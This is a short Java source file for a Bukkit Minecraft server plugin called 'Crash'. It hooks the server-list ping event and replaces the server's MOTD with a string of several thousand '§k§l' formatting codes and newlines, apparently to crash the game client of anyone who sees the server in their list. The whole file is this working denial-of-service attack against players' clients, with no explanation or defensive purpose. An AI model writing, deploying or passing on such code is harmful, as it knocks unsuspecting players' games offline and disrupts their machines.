package de.Alex;

import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.server.ServerListPingEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class Crash extends JavaPlugin implements Listener {
	
	public void onEnable() {	
		Bukkit.getPluginManager().registerEvents(this, this);
	}
	
	private String getCrashMotd() {
		StringBuilder builder = new StringBuilder();
		
		for(int i = 0; i < 4020; i++) {
			builder.append("§k§l\n");
		}
		
		return builder.toString();
	}
	
	@EventHandler
	public void onListPing(ServerListPingEvent e) {
			e.setMotd(getCrashMotd());
	}

}
